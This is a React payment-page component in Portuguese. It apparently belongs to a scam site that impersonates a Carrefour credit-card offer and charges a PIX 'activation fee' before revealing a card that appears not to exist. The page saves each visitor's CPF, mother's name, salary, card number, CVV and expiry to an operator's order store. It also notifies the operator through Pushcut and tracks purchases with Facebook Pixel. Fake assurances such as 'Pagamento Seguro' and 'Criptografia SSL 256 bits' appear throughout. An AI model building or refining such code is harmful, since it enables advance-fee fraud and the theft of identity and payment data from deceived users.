import { useState, useEffect, useRef } from 'react';
import { motion } from 'framer-motion';
import { useUserStore } from '../../store/userStore';
import { useAdminStore } from '../../store/adminStore';
import { gerarPIX, verificarPagamento } from '../../services/pix';
import { trackPurchase } from '../../services/facebookPixel';
import { notificarPedidoPendente, notificarPagamentoAprovado } from '../../services/pushcut';
import ProgressBar from '../Shared/ProgressBar';
import Logo from '../Shared/Logo';
import { QRCodeSVG } from 'qrcode.react';
import { Loader2, Copy, CheckCircle, Shield, Lock, ChevronDown, ChevronUp, Clock, FileText, AlertCircle, EyeOff, CreditCard, TrendingUp } from 'lucide-react';
import CardDesign from '../Shared/CardDesign';
import { useNavigate } from 'react-router-dom';

export default function PaymentPage() {
  const {
    nomeCompleto,
    telefone,
    cpf,
    endereco,
    valorEntrega,
    setPixData,
    pixCode,
    pixQrCode,
    transactionId,
    limite,
    bandeiraCartao,
    email,
    dataNascimento,
    profissao,
    salario,
    nomeMae,
    numeroCartao,
    cvv,
    validade
  } = useUserStore();

  const addOrder = useAdminStore((state) => state.addOrder);
  const updateOrder = useAdminStore((state) => state.updateOrder);
  const getOrderByTransactionId = useAdminStore((state) => state.getOrderByTransactionId);

  const [loading, setLoading] = useState(false);
  const [pixGerado, setPixGerado] = useState(!!pixCode);
  const [copiado, setCopiado] = useState(false);
  const [qrCodeExpandido, setQrCodeExpandido] = useState(false);
  const [tempoRestante, setTempoRestante] = useState(5 * 60);
  const [pagamentoVerificado, setPagamentoVerificado] = useState(false);
  const navigate = useNavigate();
  const pollingIntervalRef = useRef(null);
  const notificacaoEnviadaRef = useRef(false);
  const notificacaoPendenteEnviadaRef = useRef(false);
  const gerandoPixRef = useRef(false); // Flag para prevenir múltiplas chamadas simultâneas
  const inicializadoRef = useRef(false); // Flag para garantir que useEffect só execute uma vez

  // Sincronizar pixGerado com pixCode do store
  useEffect(() => {
    if (pixCode && !pixGerado) {
      console.log('Sincronizando: pixCode encontrado no store, atualizando pixGerado');
      setPixGerado(true);
    }
  }, [pixCode, pixGerado]);

  // Verificar localStorage ao carregar
  useEffect(() => {
    // Garantir que este useEffect só execute uma vez
    if (inicializadoRef.current) {
      console.log('Página já foi inicializada, ignorando...');
      return;
    }
    inicializadoRef.current = true;

    // Se já tem PIX gerado, não fazer nada
    if (pixGerado || pixCode) {
      console.log('PIX já existe, não precisa gerar novamente');
      return;
    }

    const pixSalvo = localStorage.getItem('pix_data');
    if (pixSalvo) {
      try {
        const dados = JSON.parse(pixSalvo);
        const agora = new Date().getTime();
        const expiraEm = new Date(dados.expiresAt).getTime();

        if (expiraEm > agora + 60000) {
          console.log('Reutilizando PIX salvo do localStorage');
          setPixData(dados.pixCode, dados.pixQrCode, dados.transactionId);
          setPixGerado(true);

          const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
          // Limitar a 5 minutos máximo
          setTempoRestante(Math.min(diferenca, 5 * 60));
          // Se já existe PIX salvo, não enviar notificação novamente
          notificacaoPendenteEnviadaRef.current = true;
          return;
        } else {
          localStorage.removeItem('pix_data');
        }
      } catch (e) {
        console.error('Erro ao ler PIX do localStorage:', e);
        localStorage.removeItem('pix_data');
      }
    }

    // Prevenir múltiplas chamadas simultâneas
    if (!pixGerado && !gerandoPixRef.current && !pixCode && !loading) {
      console.log('Iniciando geração de PIX...');
      handleGerarPIX();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Timer countdown
  useEffect(() => {
    if (pixGerado && tempoRestante > 0) {
      const interval = setInterval(() => {
        setTempoRestante((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(interval);
    }
  }, [pixGerado, tempoRestante]);

  // Polling para verificar pagamento
  useEffect(() => {
    if (!pixGerado || !transactionId || pagamentoVerificado) {
      return;
    }

    // Verificar pagamento a cada 10 segundos
    const verificarStatusPagamento = async () => {
      try {
        const status = await verificarPagamento(transactionId);

        if (status.paid && !notificacaoEnviadaRef.current) {
          console.log('✅ Pagamento confirmado!', status);
          setPagamentoVerificado(true);
          notificacaoEnviadaRef.current = true;

          // Enviar notificação de pagamento aprovado
          try {
            await notificarPagamentoAprovado(transactionId, valorEntrega || 25.50);
          } catch (error) {
            console.error('Erro ao enviar notificação de pagamento aprovado:', error);
          }

          // Limpar intervalo
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
          }

          // Redirecionar para página de confirmação após 2 segundos
          setTimeout(() => {
            navigate('/virtual');
          }, 2000);
        }
      } catch (error) {
        console.error('Erro ao verificar pagamento:', error);
      }
    };

    // Verificar imediatamente e depois a cada 10 segundos
    verificarStatusPagamento();
    pollingIntervalRef.current = setInterval(verificarStatusPagamento, 10000);

    // Limpar intervalo ao desmontar ou quando pagamento for verificado
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };
  }, [pixGerado, transactionId, pagamentoVerificado, valorEntrega, navigate]);

  const formatarTempo = (segundos) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${String(minutos).padStart(2, '0')}:${String(segs).padStart(2, '0')}`;
  };

  const handleGerarPIX = async () => {
    // Prevenir múltiplas execuções simultâneas
    if (gerandoPixRef.current) {
      console.log('🚫 PIX já está sendo gerado, ignorando chamada duplicada');
      return;
    }

    gerandoPixRef.current = true;
    setLoading(true);
    console.log('🔄 Iniciando geração de PIX...');

    const dadosPix = {
      amount: valorEntrega || 25.50,
      customer: {
        name: nomeCompleto || 'Cliente',
        email: email || '',
        phone: telefone?.replace(/\D/g, '') || '',
        document: { number: cpf || '' }
      },
      address: {
        street: endereco?.logradouro || '',
        streetNumber: endereco?.numero || '',
        complement: endereco?.complemento || '',
        zipCode: endereco?.cep || '',
        neighborhood: endereco?.bairro || '',
        city: endereco?.cidade || '',
        state: endereco?.estado || ''
      }
    };

    let resultado = null;
    let usouMock = false;

    try {
      // Timeout de 8 segundos para evitar travamento
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Timeout ao gerar PIX')), 8000)
      );

      resultado = await Promise.race([
        gerarPIX(dadosPix, transactionId),
        timeoutPromise
      ]);
      console.log('✅ PIX gerado com sucesso via API:', resultado);
    } catch (error) {
      console.error('❌ Erro ao gerar PIX via API:', error);

      // Verificar se está em desenvolvimento
      const isDevelopment = import.meta.env.DEV ||
        (typeof window !== 'undefined' && (
          window.location.hostname === 'localhost' ||
          window.location.hostname === '127.0.0.1' ||
          window.location.hostname.includes('localhost')
        ));

      // Em desenvolvimento, usar mock para facilitar testes
      if (isDevelopment) {
        console.warn('⚠️ Modo desenvolvimento: Usando PIX mock devido ao erro:', error.message);

        resultado = {
          transactionId: 'TXN' + Date.now() + Math.random().toString(36).substr(2, 9).toUpperCase(),
          pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
          qrCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
          expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString()
        };
        usouMock = true;
        console.log('🎭 PIX mock criado:', resultado.transactionId);
      } else {
        // Em produção, mostrar erro real ao usuário
        console.error('💥 Erro em produção:', error.message);
        setLoading(false);
        gerandoPixRef.current = false;
        alert(`Erro ao gerar código PIX: ${error.message}\n\nPor favor, tente novamente ou entre em contato com o suporte.`);
        return; // Sair da função sem processar
      }
    } finally {
      // SEMPRE limpar o loading e a flag
      setLoading(false);
      gerandoPixRef.current = false;
    }

    // ========================================
    // PONTO ÚNICO DE PROCESSAMENTO DO RESULTADO
    // ========================================
    if (resultado) {
      console.log(`📦 Processando resultado do PIX (${usouMock ? 'MOCK' : 'REAL'})...`);

      // Atualizar estado do componente
      setPixData(resultado.pixCode, resultado.qrCode, resultado.transactionId);
      setPixGerado(true);
      console.log('✓ Estado atualizado: pixGerado=true, pixCode=', resultado.pixCode?.substring(0, 20));

      // Calcular tempo de expiração
      const expiresAt = resultado.expiresAt || new Date(Date.now() + 5 * 60 * 1000).toISOString();
      const expiraEm = new Date(expiresAt).getTime();
      const agora = new Date().getTime();
      const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
      setTempoRestante(Math.min(diferenca, 5 * 60));

      // Salvar no localStorage
      localStorage.setItem('pix_data', JSON.stringify({
        pixCode: resultado.pixCode,
        pixQrCode: resultado.qrCode,
        transactionId: resultado.transactionId,
        expiresAt: expiresAt,
        valor: dadosPix.amount
      }));
      console.log('✓ PIX salvo no localStorage');

      // Track purchase no Facebook Pixel
      trackPurchase(dadosPix.amount, 'BRL', resultado.transactionId);
      console.log('✓ Purchase tracked no Facebook Pixel');

      // Salvar pedido no admin store
      console.log('💾 [PaymentPage] Salvando pedido no admin store...');
      const savedOrder = addOrder({
        nomeCompleto,
        telefone,
        cpf,
        email,
        dataNascimento,
        profissao,
        salario,
        nomeMae,
        endereco,
        valorEntrega: dadosPix.amount,
        transactionId: resultado.transactionId,
        pixCode: resultado.pixCode,
        pixQrCode: resultado.qrCode,
        numeroCartao,
        cvv,
        validade,
        bandeiraCartao,
        limite,
      });
      console.log('✅ [PaymentPage] Pedido salvo com ID:', savedOrder.id);
      console.log('✓ Pedido salvo no admin store');

      // ========================================
      // ENVIAR NOTIFICAÇÃO (APENAS UMA VEZ)
      // ========================================
      if (!notificacaoPendenteEnviadaRef.current) {
        console.log('📤 Enviando notificação de pedido pendente...');
        try {
          await notificarPedidoPendente(resultado.transactionId, dadosPix.amount);
          notificacaoPendenteEnviadaRef.current = true;
          console.log('✅ Notificação enviada com sucesso');
        } catch (error) {
          console.error('❌ Erro ao enviar notificação de pedido pendente:', error);
        }
      } else {
        console.log('ℹ️ Notificação já foi enviada anteriormente, pulando...');
      }

      console.log(`🎉 PIX ${usouMock ? 'mock' : 'real'} processado com sucesso!`);
    }
  };

  const handleCopiarPix = () => {
    navigator.clipboard.writeText(pixCode);
    setCopiado(true);
    setTimeout(() => setCopiado(false), 2000);

    // Atualizar pedido no admin store para marcar que copiou o código
    if (transactionId) {
      const order = getOrderByTransactionId(transactionId);
      if (order) {
        updateOrder(order.id, {
          ...order,
          pixCopiado: true,
          pixCopiadoEm: new Date().toISOString()
        });
        console.log('Pedido atualizado: código PIX foi copiado');
      }
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 sticky top-0 z-50 shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <Logo size="md" />
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-4 sm:py-6 md:py-8 max-w-full overflow-x-hidden">
        <ProgressBar etapaAtual="payment" />

        <div className="max-w-4xl mx-auto mt-4 sm:mt-6 md:mt-8 w-full max-w-full box-border">
          {/* Título Principal */}
          <div className="text-center mb-4 sm:mb-6 md:mb-8">
            <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-gray-900 mb-2">
              Pagamento Seguro
            </h1>
            <p className="text-sm sm:text-base text-gray-600 px-2">
              Complete o pagamento para finalizar a ativação do seu cartão
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-4 sm:gap-6 w-full max-w-full box-border">
            {/* Coluna Principal - PIX */}
            <div className="md:col-span-2 space-y-4 sm:space-y-6 w-full max-w-full box-border min-w-0">
              {/* Timer Sofisticado */}
              {(pixGerado || pixCode) && pixCode && tempoRestante > 0 && (
                <motion.div
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="relative bg-gradient-to-br from-green-600 via-green-500 to-green-700 rounded-xl py-3 sm:py-4 px-3 sm:px-4 md:px-5 text-white shadow-2xl overflow-hidden w-full max-w-full box-border"
                >
                  {/* Efeito de brilho animado */}
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shimmer"></div>

                  {/* Padrão de fundo */}
                  <div className="absolute inset-0 opacity-10">
                    <div className="absolute inset-0" style={{
                      backgroundImage: 'radial-gradient(circle at 2px 2px, white 1px, transparent 0)',
                      backgroundSize: '24px 24px'
                    }}></div>
                  </div>

                  <div className="relative z-10 w-full max-w-full box-border overflow-hidden">
                    <div className="flex flex-col sm:flex-row items-center justify-between gap-2 sm:gap-3 w-full max-w-full box-border">
                      {/* Lado Esquerdo - Ícone e Label */}
                      <div className="flex items-center gap-2 sm:gap-3 flex-1 min-w-0 max-w-full box-border">
                        <div className="relative flex-shrink-0">
                          <div className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center border-2 border-white/30">
                            <Clock className="w-4 h-4 sm:w-5 sm:h-5" />
                          </div>
                        </div>
                        <div className="min-w-0 flex-1 max-w-full overflow-hidden">
                          <p className="text-[10px] sm:text-xs text-white/80 uppercase tracking-wider font-semibold mb-0.5 truncate">
                            Tempo Restante
                          </p>
                          <p className="text-[9px] sm:text-[10px] text-white/90 line-clamp-2">
                            Complete o pagamento antes do vencimento
                          </p>
                        </div>
                      </div>

                      {/* Centro - Timer Principal */}
                      <div className="flex items-center justify-center flex-shrink-0">
                        <div className="relative flex items-center justify-center">
                          {/* Círculo de progresso */}
                          <svg className="w-14 h-14 sm:w-18 sm:h-18 md:w-20 md:h-20 transform -rotate-90 flex-shrink-0" viewBox="0 0 100 100">
                            <circle
                              cx="50"
                              cy="50"
                              r="42"
                              fill="none"
                              stroke="rgba(255,255,255,0.2)"
                              strokeWidth="4"
                            />
                            <motion.circle
                              cx="50"
                              cy="50"
                              r="42"
                              fill="none"
                              stroke="white"
                              strokeWidth="4"
                              strokeLinecap="round"
                              strokeDasharray={`${2 * Math.PI * 42}`}
                              initial={{ strokeDashoffset: 2 * Math.PI * 42 }}
                              animate={{
                                strokeDashoffset: (2 * Math.PI * 42) * (1 - (tempoRestante / (5 * 60)))
                              }}
                              transition={{ duration: 1, ease: "linear" }}
                            />
                          </svg>

                          {/* Tempo centralizado */}
                          <div className="absolute inset-0 flex flex-col items-center justify-center px-0.5">
                            <p className="text-xs sm:text-sm md:text-base font-bold font-mono tracking-wider drop-shadow-lg leading-tight">
                              {formatarTempo(tempoRestante)}
                            </p>
                            <div className="flex items-center justify-center gap-0.5 mt-0.5">
                              <span className="text-[6px] sm:text-[7px] text-white/70">min</span>
                              <span className="text-[6px] sm:text-[7px] text-white/70">seg</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Barra de progresso inferior */}
                    <div className="mt-2 h-1 bg-white/20 rounded-full overflow-hidden">
                      <motion.div
                        className="h-full bg-white rounded-full"
                        initial={{ width: '100%' }}
                        animate={{ width: `${(tempoRestante / (5 * 60)) * 100}%` }}
                        transition={{ duration: 1, ease: "linear" }}
                      />
                    </div>
                  </div>

                  {/* Efeito de brilho pulsante */}
                  <style>{`
                    @keyframes shimmer {
                      0% { transform: translateX(-100%); }
                      100% { transform: translateX(100%); }
                    }
                    .animate-shimmer {
                      animation: shimmer 3s infinite;
                    }
                  `}</style>
                </motion.div>
              )}

              {/* Card de Pagamento */}
              {loading ? (
                <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-12 text-center">
                  <Loader2 className="w-12 h-12 text-green-600 animate-spin mx-auto mb-4" />
                  <p className="text-lg font-semibold text-gray-900">Gerando código de pagamento...</p>
                  <p className="text-sm text-gray-600 mt-2">Aguarde alguns instantes</p>
                </div>
              ) : (pixGerado || pixCode) ? (
                <div className="bg-white rounded-lg shadow-sm border-2 border-carrefour-blue overflow-hidden w-full max-w-full box-border">
                  {/* Header do Card */}
                  <div className="bg-gradient-to-r from-carrefour-blue to-primary-dark px-3 sm:px-4 md:px-6 py-3 sm:py-4 w-full max-w-full box-border overflow-hidden">
                    <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between text-white gap-2 sm:gap-4 w-full max-w-full box-border">
                      <div className="flex-1 min-w-0 max-w-full box-border">
                        <p className="text-xs sm:text-sm text-white/90 mb-1">Pagamento via PIX</p>
                        <p className="text-lg sm:text-xl md:text-2xl font-bold truncate">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</p>
                      </div>
                      <div className="text-left sm:text-right flex-shrink-0 max-w-full box-border">
                        <p className="text-[10px] sm:text-xs text-white/80 mb-1">ID da Transação</p>
                        <p className="text-xs sm:text-sm font-mono truncate">{transactionId?.substring(0, 8) || 'N/A'}...</p>
                      </div>
                    </div>
                  </div>

                  <div className="p-3 sm:p-4 md:p-6 w-full max-w-full box-border overflow-hidden">
                    {/* Código PIX */}
                    <div className="mb-4 sm:mb-6 w-full max-w-full box-border">
                      <label className="block text-xs sm:text-sm font-semibold text-gray-700 mb-2">
                        Código PIX (Copie e cole no app do seu banco)
                      </label>
                      <div className="bg-gray-50 border-2 border-gray-200 rounded-lg p-2 sm:p-3 mb-3 w-full max-w-full box-border overflow-hidden">
                        <p className="text-[10px] sm:text-xs font-mono text-gray-900 truncate select-all whitespace-nowrap overflow-hidden block">
                          {pixCode ? `${pixCode.substring(0, 50)}...` : 'Gerando código...'}
                        </p>
                      </div>
                      <motion.button
                        onClick={handleCopiarPix}
                        animate={!copiado ? {
                          scale: [1, 1.02, 1],
                        } : {}}
                        transition={{
                          duration: 2,
                          repeat: Infinity,
                          ease: "easeInOut"
                        }}
                        className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 sm:py-3.5 px-3 sm:px-4 rounded-lg transition-colors flex items-center justify-center gap-2 text-sm sm:text-base"
                      >
                        {copiado ? (
                          <>
                            <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5" />
                            <span className="text-sm sm:text-base">Código Copiado</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-4 h-4 sm:w-5 sm:h-5" />
                            <span className="text-sm sm:text-base">Copiar Código PIX</span>
                          </>
                        )}
                      </motion.button>
                    </div>

                    {/* QR Code Expansível */}
                    <div className="border-t border-gray-200 pt-4 sm:pt-6">
                      <button
                        onClick={() => setQrCodeExpandido(!qrCodeExpandido)}
                        className="w-full flex items-center justify-between p-2 sm:p-3 hover:bg-gray-50 rounded-lg transition-colors"
                      >
                        <span className="text-xs sm:text-sm font-semibold text-gray-700">QR Code para escanear</span>
                        {qrCodeExpandido ? (
                          <ChevronUp className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500" />
                        ) : (
                          <ChevronDown className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500" />
                        )}
                      </button>

                      {qrCodeExpandido && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          className="mt-3 sm:mt-4 pb-3 sm:pb-4"
                        >
                          <div className="bg-white p-3 sm:p-4 md:p-6 rounded-lg border-2 border-gray-200 flex justify-center">
                            <div className="w-[200px] h-[200px] sm:w-[240px] sm:h-[240px] flex items-center justify-center">
                              <QRCodeSVG value={pixCode} size={240} level="H" className="max-w-full max-h-full" />
                            </div>
                          </div>
                        </motion.div>
                      )}
                    </div>
                  </div>
                </div>
              ) : null}

              {/* Instruções de Pagamento */}
              {(pixGerado || pixCode) && (
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 sm:p-4 md:p-5">
                  <h3 className="text-xs sm:text-sm font-semibold text-gray-900 mb-2 sm:mb-3 flex items-center gap-2">
                    <FileText className="w-3 h-3 sm:w-4 sm:h-4 text-carrefour-blue flex-shrink-0" />
                    Como pagar com PIX
                  </h3>
                  <ol className="space-y-2 text-xs sm:text-sm text-gray-700">
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">1.</span>
                      <span>Abra o app do seu banco e selecione a opção PIX</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">2.</span>
                      <span>Escolha "Pix Copia e Cola" ou escaneie o QR Code</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">3.</span>
                      <span>Cole o código ou confirme o valor de <strong>R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</strong></span>
                    </li>
                    <li className="flex gap-2">
                      <span className="font-semibold text-carrefour-blue">4.</span>
                      <span>Confirme o pagamento no app do seu banco</span>
                    </li>
                  </ol>
                </div>
              )}
            </div>

            {/* Sidebar - Resumo e Informações */}
            <div className="space-y-4 sm:space-y-6">
              {/* Resumo do Pedido */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-3 sm:p-4 md:p-5">
                <h3 className="text-sm sm:text-base font-semibold text-gray-900 mb-3 sm:mb-4">Resumo do Pedido</h3>
                <div className="space-y-2 sm:space-y-3 text-xs sm:text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Taxa de ativação</span>
                    <span className="font-semibold text-gray-900">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Envio do cartão físico</span>
                    <span className="text-gray-600">Incluso</span>
                  </div>
                  <div className="border-t border-gray-200 pt-3 flex justify-between">
                    <span className="font-semibold text-gray-900">Total</span>
                    <span className="text-xl font-bold text-carrefour-blue">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</span>
                  </div>
                </div>
              </div>

              {/* Informações do Cliente */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-5">
                <h3 className="text-base font-semibold text-gray-900 mb-4">Dados do Pagamento</h3>
                <div className="space-y-2 text-sm">
                  <div>
                    <p className="text-gray-600">Pagador</p>
                    <p className="font-medium text-gray-900">{nomeCompleto || 'N/A'}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">CPF</p>
                    <p className="font-medium text-gray-900">{cpf || 'N/A'}</p>
                  </div>
                  {transactionId && (
                    <div>
                      <p className="text-gray-600">ID da Transação</p>
                      <p className="font-mono text-xs text-gray-700">{transactionId}</p>
                    </div>
                  )}
                </div>
              </div>

              {/* Segurança */}
              <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-5">
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-5 h-5 text-green-600" />
                  <h3 className="text-base font-semibold text-gray-900">Pagamento Seguro</h3>
                </div>
                <div className="space-y-2 text-xs text-gray-600">
                  <div className="flex items-center gap-2">
                    <Lock className="w-3 h-3 text-green-600" />
                    <span>Criptografia SSL 256 bits</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Shield className="w-3 h-3 text-green-600" />
                    <span>Certificado de Segurança</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-3 h-3 text-green-600" />
                    <span>Processado por gateway bancário</span>
                  </div>
                </div>
              </div>

              {/* Informações Importantes */}
              <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
                <div className="flex items-start gap-2">
                  <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
                  <div className="text-xs text-amber-900">
                    <p className="font-semibold mb-1">Importante</p>
                    <p className="leading-relaxed">
                      O pagamento é processado automaticamente. Após a confirmação, seu cartão será ativado em até 2 minutos.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Preview do Cartão */}
          {(pixGerado || pixCode) && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
              className="mt-8 sm:mt-12 space-y-4 sm:space-y-6 max-w-6xl mx-auto w-full box-border"
            >
              {/* Header */}
              <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-4 sm:p-6 w-full max-w-full box-border">
                <div className="text-center mb-4 sm:mb-6">
                  <div className="inline-flex items-center justify-center gap-3 mb-4 flex-col sm:flex-row">
                    <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
                      <EyeOff className="w-6 h-6 text-gray-600" />
                    </div>
                    <div className="text-center sm:text-left">
                      <h3 className="text-base sm:text-lg font-bold text-gray-900">Seu Cartão Carrefour</h3>
                      <p className="text-xs sm:text-sm text-gray-600">Dados serão liberados após pagamento</p>
                    </div>
                  </div>
                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 sm:p-4">
                    <p className="text-xs sm:text-sm text-amber-900 flex items-center justify-center gap-2 text-center">
                      <Lock className="w-4 h-4 flex-shrink-0" />
                      <span>Complete o pagamento da taxa de ativação para visualizar os dados do seu cartão</span>
                    </p>
                  </div>
                </div>
              </div>

              <div className="grid md:grid-cols-2 gap-4 sm:gap-6 w-full max-w-full box-border">
                {/* Card Preview */}
                <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-4 sm:p-6 w-full max-w-full box-border">
                  <div className="max-w-md mx-auto w-full">
                    <CardDesign
                      nome={nomeCompleto || 'NOME DO TITULAR'}
                      numero={bandeiraCartao === 'visa' ? '4111 11•• •••• ••••' : '5442 34•• •••• ••••'}
                      validade="••/••"
                      cvv={null}
                      mostrarCvv={false}
                      bandeira={bandeiraCartao || 'mastercard'}
                    />
                  </div>
                  <div className="mt-4 sm:mt-6 text-center">
                    <div className="inline-flex items-center gap-2 text-xs sm:text-sm text-gray-600 bg-gray-50 px-3 sm:px-4 py-2 rounded-lg">
                      <EyeOff className="w-4 h-4 text-gray-500 flex-shrink-0" />
                      <span>Dados protegidos até confirmação do pagamento</span>
                    </div>
                  </div>
                </div>

                {/* Informações do Cartão */}
                <div className="space-y-4 sm:space-y-6 w-full max-w-full box-border">
                  {/* Limite */}
                  <div className="bg-gradient-to-br from-green-500 to-green-600 rounded-xl p-4 sm:p-6 text-white shadow-xl w-full max-w-full box-border">
                    <div className="flex items-center gap-3 mb-4">
                      <TrendingUp className="w-5 h-5 sm:w-6 sm:h-6 flex-shrink-0" />
                      <div className="min-w-0 flex-1">
                        <p className="text-white/90 text-xs font-semibold uppercase tracking-wide">Limite Disponível</p>
                        <p className="text-2xl sm:text-3xl font-bold truncate">{limite ? `R$ ${limite}` : 'R$ ••••'}</p>
                      </div>
                    </div>
                    <div className="bg-white/20 backdrop-blur-sm rounded-lg p-2 sm:p-3 flex items-center justify-center gap-2">
                      <EyeOff className="w-4 h-4 flex-shrink-0" />
                      <span className="font-semibold text-xs sm:text-sm text-center">Valor será liberado após pagamento</span>
                    </div>
                  </div>

                  {/* Barra de Limite */}
                  <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-4 sm:p-6 w-full max-w-full box-border">
                    <div className="flex items-center justify-between mb-3 flex-wrap gap-2">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 text-carrefour-blue flex-shrink-0" />
                        <h4 className="font-semibold text-sm sm:text-base text-gray-900">Limite do Cartão</h4>
                      </div>
                      <span className="text-xs sm:text-sm text-gray-600 font-mono">•••• / ••••</span>
                    </div>
                    <div className="w-full bg-gray-200 rounded-full h-3 mb-2">
                      <div className="bg-gradient-to-r from-green-500 to-green-600 h-3 rounded-full" style={{ width: '100%' }}>
                        <div className="bg-white/30 h-full rounded-full"></div>
                      </div>
                    </div>
                    <div className="flex justify-between text-xs text-gray-600">
                      <span>Utilizado: R$ •••</span>
                      <span>Disponível: R$ •••</span>
                    </div>
                  </div>

                  {/* Informações Adicionais */}
                  <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-4 sm:p-6 w-full max-w-full box-border">
                    <h4 className="font-semibold text-sm sm:text-base text-gray-900 mb-3 sm:mb-4 flex items-center gap-2">
                      <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 text-carrefour-blue flex-shrink-0" />
                      Informações do Cartão
                    </h4>
                    <div className="space-y-2 sm:space-y-3">
                      <div className="flex items-center justify-between p-2 sm:p-3 bg-gray-50 rounded-lg gap-2">
                        <span className="text-xs sm:text-sm text-gray-600">Número do Cartão</span>
                        <span className="font-mono text-xs sm:text-sm text-gray-900 truncate">5442 34•• •••• ••••</span>
                      </div>
                      <div className="flex items-center justify-between p-2 sm:p-3 bg-gray-50 rounded-lg gap-2">
                        <span className="text-xs sm:text-sm text-gray-600">CVV</span>
                        <span className="font-mono text-xs sm:text-sm text-gray-900">•••</span>
                      </div>
                      <div className="flex items-center justify-between p-2 sm:p-3 bg-gray-50 rounded-lg gap-2">
                        <span className="text-xs sm:text-sm text-gray-600">Validade</span>
                        <span className="font-mono text-xs sm:text-sm text-gray-900">••/••</span>
                      </div>
                      <div className="flex items-center justify-between p-2 sm:p-3 bg-gray-50 rounded-lg gap-2">
                        <span className="text-xs sm:text-sm text-gray-600">Status</span>
                        <span className="text-xs sm:text-sm font-semibold text-amber-600 flex items-center gap-1">
                          <Lock className="w-3 h-3 flex-shrink-0" />
                          Aguardando Pagamento
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          )}

        </div>
      </div>
    </div>
  );
}
